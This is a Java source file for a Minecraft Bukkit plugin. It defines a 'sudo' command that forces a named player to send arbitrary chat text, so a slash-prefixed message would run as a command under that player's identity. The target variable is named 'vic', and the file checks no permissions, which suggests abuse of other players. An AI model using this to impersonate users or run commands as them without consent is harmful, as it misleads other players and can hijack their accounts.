package de.garkolym.cp.commands.impl;

import de.garkolym.cp.Start;
import de.garkolym.cp.commands.Category;
import de.garkolym.cp.commands.CommandBase;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

public class Command_SUDO extends CommandBase {

    public Command_SUDO() {
        super("sudo", "<Spieler> <Befehl>" + " §d| " + ChatColor.GRAY + "Von jmd. schreiben", Category.OTHER);
    }

    public void execute(String[] args, Player p) {
        if (args.length > 2) {
            try {
                String Befehl = "";
                Player vic = Bukkit.getPlayer(args[1]);

                for (int i = 2; i < args.length; ++i) {
                    Befehl = Befehl + args[i] + " ";
                }

                vic.chat(Befehl);
                p.sendMessage(Start.INSTANCE.chatPrefix + "Die Nachricht wurde von diesem Spieler abgeschickt!");
            } catch (Exception ignored) {
            }
        }
    }

}
